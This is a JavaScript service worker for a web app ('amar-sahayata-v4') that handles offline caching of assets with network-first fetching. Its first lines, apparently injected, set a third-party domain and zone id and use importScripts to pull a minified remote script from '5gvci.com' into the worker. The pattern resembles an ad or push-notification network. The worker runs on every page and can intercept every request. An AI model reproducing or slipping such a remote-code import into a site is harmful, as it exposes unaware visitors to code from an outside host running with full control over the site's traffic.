self.options = {
    "domain": "5gvci.com",
    "zoneId": 11652796
}
self.lary = ""
importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw')

const CACHE = "amar-sahayata-v4";
const ASSETS = ["./", "./index.html", "./manifest.webmanifest"];

self.addEventListener("install", event => {
  event.waitUntil(caches.open(CACHE).then(cache => cache.addAll(ASSETS)));
  self.skipWaiting();
});

self.addEventListener("activate", event => {
  event.waitUntil(
    caches.keys().then(keys =>
      Promise.all(keys.filter(k => k !== CACHE).map(k => caches.delete(k)))
    ).then(() => self.clients.claim())
  );
});

self.addEventListener("fetch", event => {
  const req = event.request;
  if (req.method !== "GET") return;
  const url = new URL(req.url);

  // API calls always go to the server; never cache user/dynamic data.
  if (url.pathname.startsWith("/api/")) {
    event.respondWith(fetch(req));
    return;
  }

  event.respondWith(
    fetch(req).then(response => {
      if (response && response.ok && url.origin === location.origin) {
        const copy = response.clone();
        caches.open(CACHE).then(cache => cache.put(req, copy)).catch(() => {});
      }
      return response;
    }).catch(() => caches.match(req))
  );
});
